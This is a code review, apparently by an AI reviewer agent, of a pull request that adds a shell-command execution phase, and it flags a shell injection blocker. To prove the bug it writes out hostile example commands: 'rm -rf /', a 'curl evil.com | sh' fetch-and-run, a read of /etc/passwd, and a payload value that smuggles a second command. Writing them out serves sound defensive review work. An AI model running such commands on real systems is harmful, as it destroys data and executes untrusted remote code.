# Code Review: #190 — Command Execution Phase Type

**Branch:** `feat/190-command-execution`
**Reviewer:** Opus (sub-agent)
**Date:** 2026-02-28
**Verdict:** REQUEST_CHANGES

---

## Summary

Adds a `COMMAND` phase type that bypasses the LLM executor and runs shell commands via `subprocess`. Includes security allowlist, variable interpolation, timeout handling, and sequencer integration. Also includes supervisor hook code (#194) and its tests — reviewed here only for #190 scope.

## ✅ What's Good

- **Clean separation:** `CommandExecutor` is self-contained, well-documented, easy to test
- **Allowlist approach:** Sensible default; per-task override via `allowed_commands` payload key
- **`_SafeDict`:** Graceful handling of unknown placeholders (no KeyError)
- **Timeout handling:** Configurable, returns structured FAILED result
- **Schema changes:** COMMAND enum, escalation path (all HAIKU — correct for non-LLM tasks), max_retries=1 — all make sense
- **Tests pass:** All 8 tests green

## 🔴 CRITICAL: Shell Injection via `shell=True`

**This is a blocker.**

The security check validates only the *first token* (`shlex.split(command)[0]`), but execution uses `shell=True`. This means:

```python
# Passes allowlist (first token is "echo") but executes arbitrary code:
CommandExecutor().execute(_make_task(command="echo hello; rm -rf /"))
CommandExecutor().execute(_make_task(command="echo hello && curl evil.com | sh"))
CommandExecutor().execute(_make_task(command="echo $(cat /etc/passwd)"))
```

**The allowlist is trivially bypassable.** Any allowed command can chain arbitrary commands via `;`, `&&`, `||`, `$()`, backticks, or pipes.

### Fix Options (pick one):

1. **Use `shell=False` + `shlex.split()`** — strongest. No shell metacharacters interpreted. Requires adjusting how commands are specified (no pipes/redirects).
2. **Parse the full command for shell metacharacters** — validate there are no `;`, `&&`, `||`, `|`, `$()`, backticks, etc. Fragile but allows `shell=True`.
3. **Validate all tokens** — check every token after splitting, block if any match dangerous patterns. Still fragile with `shell=True`.

**Recommendation:** Option 1 (`shell=False`). If pipe/redirect support is needed later, add it explicitly as a composed command list.

## 🟡 Issues (Non-Blocking)

### 1. Variable interpolation → injection vector
`_interpolate` substitutes payload values directly into the command string *before* security checking. If payload values come from untrusted input:

```python
# payload["output_dir"] = "/tmp; rm -rf /"
# command template: "ls {output_dir}"
# After interpolation: "ls /tmp; rm -rf /"  → passes allowlist (first token "ls")
```

Even with `shell=False` fix, values should be sanitized or passed as separate args.

### 2. No output size limit
`capture_output=True` reads all stdout/stderr into memory. A command producing gigabytes of output will OOM the process. Add a reasonable cap (e.g., truncate to 1MB in the result).

### 3. Binary output not handled
`text=True` will raise/garble on binary output. Consider `text=False` with explicit decode + error handling, or document that commands must produce text output.

### 4. `CommandExecutor()` instantiated per call in sequencer
Line in `_execute_and_wait` creates a new `CommandExecutor()` each time. Should be a `self._command_executor` on the `PhaseSequencer` to allow configuration.

### 5. `CommandSecurityError` defined but never raised
The exception class exists but `_check_security` returns strings instead of raising. Either use it or remove it.

## 📝 Test Coverage Gaps

The 8 tests cover the happy paths well. Missing:

- **Shell injection test** — `echo; rm -rf /` should be BLOCKED (currently passes as "echo" is allowed) ← proves the critical bug
- **Interpolation injection** — payload value containing shell metacharacters
- **Empty command string** (`command=""`) — currently would hit `shlex.split("")` → empty tokens → "Empty command" error (OK, but not tested)
- **Very long output** — no test
- **Binary output** — no test
- **`cwd` parameter** — not tested
- **`allowed_commands` per-task override** — not tested
- **Full path executable** (`/usr/bin/echo`) — the `endswith` check handles this, but not tested

## 📌 Notes

- **`tests/test_supervisor.py`** — 726-line orphan from #194. Not part of #190 scope. Flagged but not a blocker. Should be moved to the #194 branch/PR.
- **Pre-existing test failure:** `test_cli_batch3.py::TestStartWithPath::test_start_content_pipeline_path` fails with SQLite locking — unrelated to this PR.
- **Supervisor code in sequencer.py diff** — `_run_supervisor_for_phase` and `_parse_supervisor_response` are #194 work that landed in this branch. Should be split out or acknowledged as intentional.

## Verdict: REQUEST_CHANGES

**Blocker:** Shell injection via `shell=True` + first-token-only validation. Must fix before merge.

After fixing, the remaining items (output limits, interpolation sanitization, test gaps) can be addressed as follow-ups.
